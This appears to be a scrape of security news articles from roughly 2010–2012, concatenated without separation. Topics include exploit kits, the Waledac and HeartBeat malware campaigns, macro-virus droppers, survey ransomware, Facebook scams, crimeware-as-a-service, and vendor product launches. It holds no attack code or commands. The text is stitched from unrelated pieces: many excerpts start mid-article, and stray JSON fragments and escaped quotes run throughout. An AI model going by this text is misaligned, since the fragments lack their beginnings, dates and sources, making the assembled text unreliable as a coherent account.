of the most popular languages used today for attacks,” Manky continued. “It is used in a growing number of poisoned document attacks (PDF), particularly with heap-spray based techniques. It's also used to launch exploits, and it is popular as a browser redirector to malicious sites, since the JavaScript code can be obfuscated and appear to be more complex than traditional IFrame based attacks from the past.” Fortinet’s monthly threat report is compiled from threat statistics and trends for June based on data collected from the company’s FortiGate network security appliances and intelligence systems in located around the world.

Both of the apps – which have since been removed by Google – claimed to be able to help users clean their phones to improve performance. However, the apps only pretend to be useful.

The attack is mitigated by the fact that in the current versions of Microsoft Windows the AutoRun feature is disabled by default. However, not all users have migrated to modern operating systems, Chebyshev noted. \"Thus, a typical attack victim is the owner of an inexpensive Android smartphone who connects his or her smartphone to a PC from time to time, for example, to change the music files on the device,\" he wrote. \"Judging by the sales statistics for Android smartphones, I would say that such people are quite numerous.

Last year McAfee trained cybercrime investigators in the Balkan region in cooperation with the Organization for Cooperation and Security in Europe (OSCE).  The McAfee Initiative to Fight Cybercrime includes calls for action from law enforcement, academia, service providers, government, the security industry and society at large to deliver more effective investigations and prosecutions of cybercrime.

According to research from security vendor Solutionary, 58 percent of the vulnerabilities targeted by the most popular exploit kits in the fourth quarter of 2012 were more than two years old. The report did not say what the most commonly exploited vulnerability was. However, researchers did find that BlackHole 2.0 – despite being the most often used exploit kit based on volume – targets fewer vulnerabilities than other exploit kits. The most versatile of the kits was Phoenix, which supports roughly 16 percent of all vulnerabilities being exploited, according to the report. That most of the vulnerabilities were at least two years old supports the idea that organizations should not just focus on patching zero-days, the report notes. “The fact that cyber criminals are able to penetrate network defenses by targeting aging vulnerabilities and using old techniques demonstrates that many organizations are still playing catch-up when it comes to cyber security,\" said Rob Kraus, director of research for Solutionary's Security Engineering Research Team (SERT), in a statement. \"Tight budgets, inability to convince stakeholders at all levels that security should be a priority, and a shortage of research resources could be among the reasons why many security and risk teams are continuing to operate in reactive mode.\" While 'From Russia with Love' may be the title of a James Bond movie, it could easily become the mantra of the creators of the exploit kits the company examined as well. According to the company, nearly 70 percent of the exploit kits it reviewed were released or developed in Russia. China and Brazil were the next in line in terms of originating exploit kits, though together they combined for only 12 percent of the kits. Thirty percent of the malware samples the company analyzed traced back to JavaScript malware variants used for redirection, obfuscation and encryption, all used in the BlackHole exploit kit. All totaled, some 18 percent of the malware samples studied by SERT in the fourth quarter were directly attributable to BlackHole, according to the report. “Exploit kits largely focus on targeting end-user applications,” Kraus said. “As a result, it is vital that organizations pay close attention to patch management and endpoint security controls in order to significantly decrease the likelihood of compromise.” " }

According to researchers at Symantec, the Waledac malware has been spotted being distributed by the Virut botnet. In 2010, Microsoft won a legal battle to takedown the Waledac botnet, which at the time was spamming out as many of 1.5 billion emails a day. Last year, researchers at Palo Alto Networks uncovered a new variant of the Waledac malware that was not only sending spam but also stealing passwords and other information. Now, Symantec said, Virut is downloading a variant of Waledac, marking another example of how malware groups using affiliate programs to spread their wares and how multiple threats can coexist on the same computer. \"While Waledac the botnet may be dead, the malware that was distributed by it has re-emerged and has been updated,\" said Satnam Narang, security response manager at Symantec. \"For instance, somewhat recently updated variants have the capability to steal Bitcoin wallets.\" Once the computer is compromised, it sends spam emails through servers from a list that it receives from the command servers, according to Symantec. During its analysis, researchers observed a compromised computer sending roughly 2,000 emails per hour. \"Conservatively, if a quarter of the estimated 308,000 computers infected with W32.Virut download W32.Waledac.D, then potentially billions of spam emails can be sent from these computers,\" Symantec's Security Response Team noted in a blog post. \"The following table contains some basic calculations on the estimated volume of emails from this campaign with totals ranging from 1.2 billion to 3.6 billion spam emails per day.\" According to Symantec, the emails used one of sixteen unique subject lines and one of thirteen unique email message bodies. Many of the emails led to Canadian online pharmacy spam, while others led to fake performance-enhancing drugs. \"Despite the botnet being taken down, the malware persists,\" said Narang. \"Today, it's being distributed by Virut. Tomorrow? Perhaps another botnet. Cyber criminals don't necessarily have to build a botnet when an online underground economy exists where affiliate programs and pay-per-install schemes are readily accessible.\" " }

According to the company, the solution extends the level of visibility and control of applications, users, and content that Palo Alto Networks provides inside the network to endpoints outside the network. Unlike traditional approaches to endpoint security, GlobalProtect ties policies related to applications, users and content to roaming users via a persistent thin client that can either be pre-installed or installed on demand. As with a VPN, remote traffic is sent over a secure tunnel. However, unlike typical VPN deployments, which direct traffic to a few geographically centralized gateways, the GlobalProtect client connects to the nearest corporately-managed Palo Alto Networks firewall deployed at a hub, branch, or in a private cloud. This results in faster throughput, easier management, and better protection.  “The three traditional approaches to endpoint security – client-side software suites, proxies, or full tunnel VPNs – typically have resulted in significant performance impacts, management headaches, or bad user experiences,” said Rene Bonvanie, vice president of worldwide marketing at Palo Alto Networks. “We are… introducing a new approach to managing and securing remote endpoints.”  GlobalProtect will be available in the fourth quarter of 2010 and will initially support Windows-based PCs and laptops.

The vulnerability, uncovered by security researcher Shahin Ramezany of Abysssec, is believed to have led to millions of Yahoo mail users being at risk. In a YouTube video, Ramezany demonstrated an exploit for the issue, which he described as a document object model-based cross-site scripting bug.   According to Yahoo, this bug is different than the one reported by security blogger Brian Krebs last November. \"At Yahoo! we take security very seriously and invest heavily in measures to protect our users and their data,\" a spokesperson told SecurityWeek. \"We are investigating recent reports of user accounts that may have been compromised to send abusive email and will work diligently to fix any vulnerabilities that are found.\" \"In general, we recommend using different passwords for online accounts, changing passwords from time to time, and choosing passwords that combine letters, numbers, and symbols,\" the spokesperson added.

According to Steve Quane, Chief Product Officer at Trend Micro, the in-the-cloud SaaS component “does all the heavy lifting of blocking spam outside of the enterprise’s network and reduces email volumes up to 90 percent, so that less bandwidth, servers and staff are required.” The other component, the “VMware Ready” virtual appliance, allows granular control of outbound content and customization. Both components are controlled via a single management/reporting console. The new offering also adds Web Reputation technology that scans URLs embedded in emails and examines factors such as the age of a site, its history of location changes, and suspicious activity, all of which may indicate a threat of hidden malware. The new Trend Micro solution is updated continuously via the company’s Smart Protection Network infrastructure, which scans, filters and correlates more than 20 billion emails, Web sites and files every day. According to Michael Osterman, president and founder of Osterman Research, enterprises can save 55 to 70 percent by moving from a homebrewed to an integrated hybrid email security solution. “In addition,” says Osterman, “those organizations that have yet to move to a hosted/hybrid solution can save 30 to 40 percent by moving from a traditional on-premise hardware appliance to an integrated hybrid solution from Trend Micro.” IMSVA Hybrid SaaS Email Security is offered with both perpetual and subscription based pricing, and is currently available as part of the Trend Micro Early Adopter Program throughout Summer 2010. Pricing varies by seat count and decreases with volume. Perpetual licensing prices start at $20.23 per user for 1,000 users. " }

Known as Heartbeat, the attack campaign is believed to have been active since at least November 2009. According to Trend Micro, the first HeartBeat remote access tool (RAT) component was discovered in June 2012 in the computer network of a Korean newspaper. \"The HeartBeat campaign is an isolated APT case that targets organizations within South Korea only,\" blogged Trend Micro Threat Researcher Roland Dela Paz. \"Based on our research, the campaign [had] started by at least November 2009. They target organizations that are directly or in some ways related to the South Korean government. Specifically, the HeartBeat campaign targets the following sectors: political parties; media outlets; a national policy research institute; a military branch of the South Korean armed forces; a small business sector organization [and] branches of the South Korean government.\" After the RAT component was discovered, further investigation revealed the campaign had been distributing the component to targets in 2011 and the first half of 2012. A second component was discovered to date back to November 2009.  \"Variants of their RAT contains an embedded campaign code that mostly contains strings that describes their respective decoy documents and a campaign date in MMDD format,\" Dela Paz blogged. Once on a victim's computer, the malware opens up a backdoor and gives the attackers full access to the machine. While the report said it is unclear how the malware arrives on victims' systems, Trend Micro suspects spear-phishing emails were used. In fact, the packaged malware used the icon of the decoy document to look legitimate, Trend Micro stated in the report. If the decoy is an XLS file for example, the package will appear to have an XLS document icon. \"Based on the samples we collected, the campaign’s decoy documents used the file formats .JPG, .PDF, XLS, and HWP, the Korean government standard word processor format,\" according to the report. \"One of the previous HeartBeat attacks even dropped a pornographic .JPG image as decoy. Below is a screenshot of a Hangul Word Processor (.HWP) document used as bait in November 2011. Its document title roughly translates to 'Information to the President.hwp'.\" \"Once users open the packaged malicious file, the actual document is displayed to the user while a RAT installer in .EXE format runs in the background,\" the report continues. \"The RAT installer, on the other hand, drops a .DLL file that is then injected to the legitimate process svchost.exe. The injected code in svchost.exe then connects to the malware command and control (C&C) server to register infection and wait for remote commands.\"  The campaign's command and control domains appear to use a site redirection service, with the sites redirecting to IP addresses from Internet Service Providers (ISPs) in Armenia, Japan, India, Korea and the United States. The attackers updated the IP address of some of their C&C domains, and all of their IP addresses belong to legitimate ISPs. Because of this, researchers suspect these IP addresses are compromised hosts that act as proxy servers that redirect traffic to the actual C&C servers. \"Clues relating to the attackers remain very limited,\" according to the report. \"Using compromised hosts as C&C proxy servers minimizes the possibility of tracking potential threat actors.\" That doesn't mean there were no potential clues however. In order to track their campaigns and victims, the attackers used campaign codes that contained campaign dates and strings that described specific campaigns. These codes were embedded in the RAT binaries, and sent to their C&C servers along with information about the targets' systems. Some of these codes included Chinese words such as guohui, xuehui and minzhu – though some of the C&C domain names contained English words.   \"While having an isolated target may have helped them stay under the security industry’s radar, the attackers illustrated that they were very careful but persistent,\" according to the report. \"Understanding targeted campaigns and their methodologies is fundamental in protecting both end users and organizations. Not only does it help in coming up with effective defensive strategies through multiple protection layers, it also helps with predicting possible targets in the future and ultimately, raise awareness.\" " }

AVG LinkScanner for Mac is a free AVG product designed for the Mac OS X Leopard and Snow Leopard operating systems. It supports the Safari 3.x, Safari 4.x and Safari 5.x internet browsers as well as Mozilla Firefox 3.x and higher. AVG LinkScanner for Mac essentially works like the company’s LinkScanner for Windows, which is also free and has more than 95 million users. According to AVG, the new offering ensures users not only that it’s safe to visit a particular page, but also that it’s safe to enter personal and private information on that page. LinkScanner makes this claim based on AVG’s practice of continuously updating threat information gathered by its research team and user community, and checking each web page a user visits in real-time prior to opening it. If LinkScanner detects threats, it issues a warning that users should not open the page. “Mac users have traditionally been less vulnerable to virus threats and attacks because of their lower market share,” said J.R. Smith, CEO of AVG Technologies, “But that is quickly changing and no operating system is immune.” LinkScanner for Mac can be downloaded from the AVG Download web page free of charge, or at www.download.com.

The Fix it tool is aimed at addressing a vulnerability discovered in the wild roughly a week ago. According to Microsoft, the issue affects IE versions 6, 7 and 8. Internet Explorer 9 and 10 are not impacted. The bug exists in the way that IE accesses an object in memory that has been deleted or not properly allocated. As a result, memory can be corrupted in a way that would allow an attacker to remotely execute code with the rights of the logged on user. The release of the tool follows Microsoft's decision to issue an advisory on the bug during the weekend.  \"This easy, one-click Fix it is available to everyone and prevents the vulnerability from being used for code execution without affecting your ability to browse the Web,\" blogged Dustin Childs, group manager of Microsoft Trustworthy Computing.

In addition to expanded HTML5 support, an upgraded “Nitro JavaScript Engine” and other features, Safari 5 adds some enhanced performance and security features useful to both developers and end users. With the release of Safari 5, Apple will provide Safari developers with tools to create a digital certificate for extensions. Safari extensions must be signed with an Apple-provided digital certificate. The certificate protects the extensions from tampering and ensures that updates come only from the developer that owns it.  In addition, Safari extensions include built-in defenses like sandboxing which safeguards extensions from being used to access information on a user’s system. Built with standard web technologies, Safari extensions execute right in the browser, reducing the chance of an extension causing crashes or instability.  While not exactly a pure “security” feature, an improved Web Inspector lets users view how Safari interacts with websites. Loading, scripting, and rendering timelines show how and when Safari parses HTML, executes JavaScript, and performs other operations with a web application. Additional improvements to the Web Inspector make it easy for developers to pinpoint areas for optimization and can be a useful tool for security researchers and QA teams.  In addition to new security features and functions, Apple also fixed other vulnerabilities including CSS history hacks, potential HTTPS to HTTPS data leaks and more.

Radware (NASDAQ:RDWR), a provider of application delivery solutions, aims to help businesses defend against these hybrid attacks with a security solution that connects several defenses together. Radware this week announced “APSolute Attack Prevention,” an attack mitigation solution for networks and datacenters, which integrates different tools and technologies with management and reporting tools, working synchronously to provide comprehensive protection to best detect and prevent hybrid threats. Many organizations currently have individual protection tools deployed such as Intrusion Prevention System (IPS), Network Behavioral Analysis (NBA) and Denial of Service (DoS) protection which can be complex and costly. \"We are witnessing through the widespread attacks on enterprises and governments a distinct change in the threat landscape. Cybercriminals and hackers are using attack vectors that employ not just one but multiple threat types and don't always exploit known vulnerabilities,\" stated Charles Kolodgy, research vice president for IDC's Security Products. \"Our research also indicates that organizations are seeking to integrate a wide variety of security techniques to provide extensible security through a single vendor. Radware’s APSolute Attack Prevention solution uses multiple defense technologies integrating IPS, NBA and DoS protection in a single appliance. The key elements of the solution include: •\tDefensePro Appliance; an enhanced version of Radware’s network security solution; •\tAPSolute Vision, a new unified management system providing monitoring, forensics and reporting; •\tEmergency Response Team (ERT) service, a security expert offering for immediate, hands-on assistance. DefensePro employs multiple detection and prevention engines including signature detection, protocol anomaly detection, stateful inspection and traffic anomaly detection. The DefensePro appliance offers throughput of up to 12Gbps and embeds two unique and dedicated hardware components: to the DME, which helps prevent high volume DoS/DDoS flood attacks and a StringMatch Engine (SME) to accelerate signature based protection. APSolute Vision is a unified management tool that provides centralized attack management, real-time monitoring, forensics and historical reporting across the different modules, multiple DefensePro devices and locations - enabling advanced correlation for new attacks. Emergency Response Team (ERT) is an emergency security service that provides customers with a professional response that neutralizes attacks and restores network and service operational status. The ERT was specifically designed to provide a 24x7 service for customers facing DoS attacks or malware outbreaks. The ERT will provide instantaneous, expert security support to restore network and service operational status. The ERT is staffed by experts with vast knowledge and experience of network threats, detection and mitigation, and in-depth experience of the DefensePro family of products. \"With the development of APSolute Attack Prevention, we have designed a well-synchronized solution which is backed with a service offering to deliver a high-level of protection to IT infrastructures - enabling them to fight against known and emerging attacks more effectively in real-time, whilst keeping costs down and preserving performance as well as business continuity,\" stated Avi Chesla, Vice-President Security, Radware.

It is a new tack for a scam that traditionally relies on threats and intimidation, and perhaps a foreshadowing of what is to come, noted Malwarebytes Malware Intelligence Lead Adam Kujawa. \"The users are asked to fill out demographic information, personal information - [such as] name, address, phone number - and near the end of the survey, are required to click on \"special offers\" from the advertisers that usually includes something along the lines of \"Pay $1 for a year free subscription to XYZ magazine\" or \"Try a month free trial of some music download site for only $2.50\",\" he said. \"The survey justifies these offers by offering to the user a [fake] $25 or $50 gift certificate to somewhere like Walmart or BestBuy.\" In order to get access to a file with a code that can unlock their computer, users have to fill out the survey. \"So the attackers get paid (in this instance anyway) every time someone fills out the surveys - advertisers pay for the demographic data, they pay to have their special offers posted online and the person hosting or redirecting users to the survey makes money off of each user that completes a survey,\" he said. \"In the case of the Survey Ransomware, in order for the user to unlock their system, they must complete the survey. It's kind of a pay-per-click type deal.\" It is also the latest example of the growth of ransomware in 2012. According to security vendor McAfee, the first and second quarters saw the number of ransomware samples jump 50 percent. Meanwhile, last month Symantec detailed its discovery of a command and control server for a single ransomware family that showed the gang behind it made roughly $394,000 in a single month.

In addition to Norton Smartphone Security, the company announced Norton Connect Beta, a mobile application that lets iPhone or Android users access files archived on its cloud storage service, Norton Online Backup or Norton 360. The company also launched m.norton.com – a mobile destination available to all mobile users to access the latest news, videos, and downloads from Norton. Symantec is also working HTC MobilityNow, a division of device manufacturer HTC Corporation, on software development and testing on the Android platform. Norton DNS Norton DNS will provide a safer, more reliable, and faster Internet experience by delivering a variety of basic protection services like anti-phishing, antimalware and anti-spyware via Norton verified web filtering all at the DNS level. With Norton DNS, when users attempt to access a URL, it will first be verified by Norton before the browser can even attempt to reach the Web site.  Symantec will launch Norton DNS Beta as a free service – and keep the service free if the company is able to monetize the service via other means such as keyword targeted advertising on error pages when DNS lookups are unsuccessful, a common method used by Internet Service Providers. The DNS service, if widely adopted, will also give Symantec another valuable set of data from potentially millions of Internet users and insights into the sites they visit. Norton DNS will compete with OpenDNS, a similar service currently used by millions of users and organizations around the world. Norton for Smart Devices  Non PC devices that connect to the Internet such as video game consoles and televisions often have little or no security built into them. Norton for Smart Devices will bring Symantec embedded security and other services into non-PC internet connected media devices. Through a strategic partnership with Mocana Corporation, in which Symantec is an investor, Norton for Smart Devices will help device manufacturers bring new devices to market faster and more securely. Norton and Mocana solutions will help manufacturers update a device’s firmware, operating system and applications, remotely support a device, and bring secure online storage to a device in order to secure configuration settings, application data and user data. More details on the partnership will be announced soon.

Researchers at Sophos recently detected a malicious PowerPoint presentation entitled 'Will the world end in 2012?'. The file contained Visual Basic macro code that dropped an executable file. The PowerPoint was not the first macro virus the company had seen in recent days; it also had analyzed one in an Excel spreadsheet presented as a Sudoku puzzle generator.   \"Microsoft Office includes the powerful programing language Visual Basic for Applications, accessible from Office documents as macros,\" blogged Richard Wang, of SophosLabs.  \"Back in the 1990s, macros were the weapon of choice for cybercriminals. Microsoft responded by disabling macros by default, all but killing off the macro malware threat.\"   \"But macros are still in common use, and the trick used here is quite simple: if you want to generate a puzzle to solve, you have to enable macros,\" he added.   The macro in the case of the malicious PowerPoint was functionally identical to the one found in the Sudoku puzzle, noted Chester Wisniewski, a Senior Security Advisor at Sophos Canada. It also required the user to enable macros, but unlike the Sudoku attack did not offer any tips on how to do it.   \"What are these macros up to? They are designed to construct a valid Windows PE file (Portable Executable) from arrays of single bytes,\" Wisniewski blogged. \"While this isn't particularly new, it would throw off the average user from understanding what these macros are designed to do even if they bothered to take a look.\"   \"The EXE file that is extracted is what we call a dropper,\" he explained. \"It extracts another Windows PE file which downloads a picture of an owl, then contacts a command and control server. It is designed to download another payload it will rename as Wmupdate.exe, but during our testing no instructions were sent from the command-and-control server to retrieve this payload.\"   According to Wisniewski, the original uninfected version of the PowerPoint file was created by a preacher in the U.S. who appears to have nothing to do with the booby-trapped version.   \"His legitimate WordPress blog has been compromised and is currently performing search engine manipulation duties for Viagra pushers, \"off-shore\" casinos, forex fraud and payday loans,\" the researcher warned.   In the case of the Sudoku attack, the malware collects system information such as a list of the programs and services the user is running and information about the user's hardware, operating system and patches. The data is then sent out to an aol.com address.   \"While macro viruses certainly aren't a new phenomenon, they aren't something many people think about,\" Wisniewski blogged. \"Be careful with documents you acquire from random sources and never enable macros in documents you download or receive as email attachments.\" " }

United States hosts 98 percent of new malicious URLs McAfee Inc. (NYSE:MFE) has unveiled its McAfee Threats Report: First Quarter 2010, which uncovered that a USB worm has taken the No. 1 spot for top malware worldwide. Spam trends show that email subjects vary greatly from country to country with diploma spam out of China and other Asian countries on the rise. Earthquake news and other major 2010 events drive poisoned Web searches, and U.S.-based servers host the majority of new malicious URLs. Threats on portable storage devices took the lead for the most popular malware. AutoRun related infections held the No. 1 and No. 3 spots due to the widespread adoption of removable devices, mainly USB drives. A variety of password-stealing Trojans rounded out the top five. Those include generic downloaders, unwanted programs and gaming software that collects statistics anonymously. Unlike past studies, the popularity of these threats ranked consistently worldwide. While spam rates remain steady, their subjects vary considerably from country to country. One of this quarter’s biggest discoveries was that China, South Korea and Vietnam have the most significant diploma spam, which promotes the purchase of forged documents to establish qualifications for items such as jobs. Singapore, Hong Kong and Japan have exceptional rates for Delivery Status Notification spam indicating a possible issue with preventative mail-filtering capabilities.    “Our latest threat report verifies that trends in malware and spam continue to grow at our predicted rates,” said Mike Gallagher, senior vice president and chief technology officer of Global Threat Intelligence for McAfee. “Previously emerging trends, such as AutoRun malware, are now at the forefront. We were also surprised to find some of geographic difference in spam related topics, such as the volume of diploma spam coming out of China.” McAfee also found that Thailand, Romania, the Philippines, India, Indonesia, Colombia, Chile and Brazil have a higher portion of malware infections and spam. These countries have experienced significant Internet growth over the past five years and are lagging in security awareness. Attackers are leveraging major news events to poison Internet searches. Haiti and Chile earthquake disasters led the list (No. 1 and No. 2, respectively). The Toyota recall, Apple iPad and NCAA March Madness followed. Referred to as search engine manipulation, cybercriminals continue to use analytics and page-ranking logic to exploit hottest search terms and drive traffic to malicious websites. Key Findings In The Report Include: •\tThe proliferation of remote devices makes it harder to defend corporate networks. But the gadgets are not going away. IT staffers need to expand security wherever their users go. •\tRecent tragedies continue to attract scammers. Earthquakes and other disasters are money-making opportunities for cybercriminals. •\tAfter a decline and spike in 2009, spam volume has returned to mid-2008 levels. Drawing data from our worldwide spam collectors, we illustrate which spam topics are most popular in 34 countries. •\tMalware growth seems to be leveling off or declining in some areas, but the cumulative numbers are still immense. We anticipate cataloging at least as much malware this year as in 2009. •\tOperation Aurora is one of the most important targeted attacks in Internet history. Aurora may have a significant impact for years to come on the perception of corporate-focused cybercrime. •\tSpring means tax time, and tax-services scams play along. Some look convincingly like legitimate banks and national tax agencies. •\tManipulating search results can bring cybercriminals revenues from fake security software, as well as advertising income from click fraud. •\tThe Zeus Trojan is just one of the key tools of cybercriminals, who often tie password stealers with other types of illegal online material such as pornography and fake security software. The prime target for these attacks? Facebook users. •\tAlmost all URLs rated as malicious by McAfee’s TrustedSource Technology are located in the United States. Malware distributors love to use Web 2.0 features, which abound in this country. •\tThe most popular attacks on clients—including Operation Aurora—targeted Microsoft Internet Explorer and Adobe Reader and Acrobat. •\tThe justice system caught up with several cybercriminals, in cases ranging from the theft of credit card numbers to the illegal purchase and sale of concert and sports tickets. •\tOne of the most popular types of cybercrime is scareware, or fake security software. Installed invisibly, these scams convince users that their systems are infected and they must immediately purchase a tool to remove it. Scareware developers earn a phenomenal amount of money from their victims. •\tPolitical hactivism continues: Hackers interrupted service or defaced websites at a Russian magazine, the Latvian tax agency, and the Australian government. According to the report, The United States hosted 98 percent of new malicious URLs in Q1 2010, likely due to the of many Web 2.0 Services being hosted in U.S. locations. Within the remaining 2 percent, China hosted 61 percent and Canada hosted 34 percent.

According to RSA, a recent spat between Citadel's developer, known as \"Aquabox\", and one of his buyers led to him being banned from one of the \"largest online crime communities Citadel was ever a part of.\" The buyer accused Aquabox of becoming corrupt by all the money Citadel had earned him.   \"The recent accusations against Aquabox are only one of many hints that confirm the very imminent withdrawal of the Citadel Trojan, as its developers change their business model from offering it as commercially-available crimeware to a much more selective and privatized operation,\" according to a blog post today by RSA FraudAction Research Labs.   In July, RSA reported that it had found a statement on an underground forum that said updates for the Trojan would no longer be publicly available, and that only existing customers would be receiving upgrades. Others who wanted to purchase a new kit were told they would have to get an existing customer to vouch for them.   There are a number of reasons Citadel's developers may want to go private. The more readily available Citadel is, the more likely it will attract law enforcement attention, RSA noted. In addition, with some many customers, technical support can be challenging.   Finally, the team may wish to go back to focusing on other endeavors, such as fraud.   \"Citadel being taken deeper underground will likely mean a smaller, less “public” deployment of this Trojan, which could in turn result in the proliferation of Citadel variants becoming stabilized,\" according to RSA. \"It may also mean that in the long run detection rates (by AV engines) will gradually drop due to more limited sampling opportunities.   \"Although the Citadel developers are not as interested in new buyers today, the team may still return to cybercrime forums or devise another business model in an effort to return with more news in the future.\" " }

(NYSE:MFE), today announced the release of McAfee Web Gateway version 7.  With the rise in social networking and interactive applications such as blogs, wikis, RSS feeds, and other interactive Web 2.0 technologies, the Internet has evolved and enterprises are taking advantage of these innovative platforms to conduct business in more efficient, collaborative ways. With these exciting innovations in the Web 2.0 world, the threats have multiplied and what were once simple viruses have morphed into blended threats, spyware, and targeted attacks that traditional security such anti-virus and URL filtering can’t protect against.  The use of targeted attacks leveraging Web-borne malware are becoming more sophisticated and prevalent. Most of these attacks are “zero day” and are used to capture resources for ever-expanding botnets or to steal business information including personal or customer information, records, financial transactions and intellectual property. McAfee Web Gateway platform enables employee access to authorized Web 2.0 applications, while reducing risk by combining local and cloud-based protection, powered by McAfee Labs.  “Today’s most prevalent threat to enterprises is from zero-day, Web-borne malware,” said Dan Ryan, executive vice president and general manager of the Network Security business unit at McAfee. “McAfee provides protection at every stage of an attack, as demonstrated during Operation Aurora, which targeted Google and dozens of other companies. Reputation management is an essential part of that protection.”  McAfee Web Gateway takes a bi-directional hybrid security approach that includes a new intent-based anti-malware scanning engine, along with several cloud-based technologies. Integration with real-time McAfee Artemis technology protects organizations against viruses, provides mobile filtering for remote users and expands Web reputation capabilities. Through Web reputation and Global Threat Intelligence, the platform blocks access to infected websites, stops malicious content from downloading and prevents back-channel communication of infected machines.   “Our experience with McAfee Web Gateway version 7 is extremely positive. It allows for additional flexibility and granular control over the polices that we create,” said Tristan Hoar, Technical Analyst for Service Birmingham, a provider of internet service for more than 185,000 users. “This will ultimately allow us to achieve enhanced performance from the existing infrastructure as we can tune our polices to ensure the filtering decision is made in fewer steps.”  With this release, McAfee Web Gateway 7 (formerly Webwasher) offers the following enhancements:  •\tAdvanced Security: New, patent-pending approach to behavior analysis performs real-time content inspection to unveil any embedded code, buffer overflows or exploits. Cloud-based technologies offer mobile filtering for remote users, and expanded Web reputation capabilities including geo-location and URL categorization.   •\tEnhanced Performance and Scalability: McAfee Web Gateway version 7 is highly scalable with robust performance on existing appliances. Additional deployment capabilities include support for VMware and transparent proxy options for added flexibility and control.  •\tFull content security: Companies can realize increased security and cost savings from integration of McAfee Web and Email Gateways with McAfee Network Data Loss Prevention and the McAfee ePolicy Orchestrator platform. These integrations help organizations achieve a significant return on their investments while leveraging the benefits of Web 2.0 enabled applications.  McAfee Web Gateway version 7 is currently available and is licensed on per user basis. Exact pricing is determined based on customer requirements and selected deployment methods which include appliances or VMware. " }

The scam was first detected by Websense last week, and dropped off initially before having a resurgence this weekend.  \"This isn't the end though,\" Websense noted in a Dec. 7 blog post. \"The page also has a timeout mechanism.  If the victim doesn't play the video they are greeted with a \"Merry Christmas!\" message and are redirected to a fake Facebook page offering some fake free vouchers.\"   Some of the fake vouchers are made to appear as though they are from stores such as Best Buy, Walmart and Asda, the British supermarket chain.   \"The fake voucher page for Asda takes the victim through the scam step by step,\" according to Websense. \"First, in order to get the free voucher the victim has to share the voucher in their Facebook profile. Second, the victim must publish the comment \"Thanks Asda!\" to support the scam. Lastly, the user must click the Like button, which is a scam link.\"     \"After the victim completes the steps, their Facebook news feed includes the fake voucher scam and they are redirected to a legitimate web site at new.activeyou.co.uk that gives out prizes and supports an affiliate program,\" the company's blog post continues. \"The way this works is that any user coming to the site --  thanks to a certain affiliate -- and who participates, earns the affiliate somfe money; there is no free voucher after all. The affiliate here obviously engages in illegal methods to advertise and generate traffic to a web site that earns them money.\"   As part of the attack, the scam hosts use the DNS servers of freedns.afraid.org, which offers domain owners free DNS services. The name server records used by the websites involved in the attack use Afraid.org DNS servers and point to ns1.afraid.org. Using the infrastructure of freedns.afraid.org allows the attackers to employ a massive number of varied scam hosts, Websense explained. \"In this attack, accounts/hosts on freedns.afraid.org have been used to serve scams URLs by pointing subdomains of legitimate hosts to the attackers' infrastructure,\" according to Websense. \"If we examine some of the scam hosts involved in the attack, we can see that they point to a different IP address than the one used at the host level. Websites at the host level vary in purpose and seem to be legitimate websites.\" Dubbing the scam \"Jacked Frost,\" Websense said that the number of unique URLs related to this scam doubled on Saturday before dropping off again. \"This shows how cyber crooks time their attacks to times where users are more laid back and when the security community is less likely to alert users on this type of threat,\" the company blogged Dec. 10.

In an interview with SecurityWeek, Trend Micro Senior Threat Researcher Loucif Kharouni said that once the ZeuS and SpyEye creators left the scene, researchers have noticed a growing business in offering installation to other cybercriminals who would install ZeuS 2.0.8.9 or 2.1.0.1 for a fee. \"You never get the toolkit by itself, they would provide you the binary to spread too,\" he said. \"Same thing for SpyEye, the latest version 1.3.48 is one year old now and similar to ZeuS, you would find some guys making the installation for you and provide you the binary. Same thing with Citadel, this is what we call SaaS (software as a service). Toolkit creators and exploit pack creators are now more reluctant to give away their creation.\"   The notorious Blackhole kit has also moved towards a SaaS model to avoid any leaks of their code, he said.   \"Compare to a toolkit, an exploit pack is just composed of a php file and could easily be manipulated if not protected,\" he told SecurityWeek. \"Compared to any other exploit pack, Blackhole is well coded, stable and reliable with a good infection rate, due to the latest exploits used and provided in the pack. The creator do not provide the pack itself and instead installs it for you and will protect the php files using the well know ioncube software which is used to encode php files.\"   This is also beneficial for the customer as they are not spending money on products that will be leaked and made available to everyone for free, he said. Cybercriminals are also paying more attention to securing their tools and the servers they use, he noted. For example, attackers in Latin America have stopped using hijacked servers to host command and control (C&C) servers, spam tools or malware. Instead, they have begun using their own servers in data centers around the world and are staying off of Google search results by not registering any hostname and only using IP addresses, he blogged. The time when researchers could find an open server is essentially over, and more and more cybercriminals are providing secure webhosting to other criminals, he wrote. \"Recent take downs and hacks have taught everybody in the underground a lesson,\" the researcher blogged. \"They now have to be more secure and cautious, protecting their servers against researchers and other criminals. Usually, researchers look for open folders and servers. This is basically looking for accessible folders and/or configuration files and also login shells to gain access to the server and start investigating it.\"   To deal with today's underground, researchers need to develop partnerships with Internet Service Providers (ISPs) for takedown operations and look for new ways to find information, he blogged.   \"Security researchers need to adapt and adjust to these new methods and try to find new solutions to track attackers and follow the evolution of their business and operation,\" he noted. \"Scanning servers and hoping to find open servers isn’t enough anymore. Neither is monitoring forums – these are now used mainly to chat and advertise, but private messages are no longer being used to carry out business. Instead, they are used to exchange instant messaging accounts where the actual transaction is done.\" " }

The Java exploit targets the same vulnerability used by the \"Flashback\" malware attacks earlier this year – CVE-2012-0507, which has been patched. Current versions of Mac OS X and anyone with their browser's Java plugin disabled should be safe from the exploit, Sullivan added.   \"This is not the first time gyalwarinpoche.com has been compromised and it certainly isn't the first time Tibetan related NGOs have been targeted,\" he noted.   In fact, just last month Tibetan activists were observed being targeted by a new variant of the Imuler (Revir) Trojan via malicious emails. The messages would include images of pro-Tibetan groups as a lure to get victims to open the malicious files. Once executed, the malware would steal data from the system and upload it to a remote server.   Another attack targeting Tibetan activists was uncovered in March when researchers at Trend Micro released details about an attack campaign whose targets not only included the activists but also military research, aerospace and energy companies in India and Japan.   The malware in the latest attack is detected as OSX/Bckdr-RNW by Sophos. According to Senior Technology Consultant Graham Cluley, once a computer is infected, attackers will be able to steal data from the system and capture the victim's keystrokes.   \"The attack was presumably designed to infect computers visiting the Dalai Lama-related website, which - one would imagine - would belong to [sympathizers] with the exiled Tibetan government,\" he blogged.   There is also an exploit for CVE-2012-4681 that delivers a Windows-based payload – Trojan.Agent.AXMO, Sullivan noted. Like CVE-2012-0507, CVE-2012-4681 is a Java vulnerability and was patched by Oracle earlier in the year.  " }

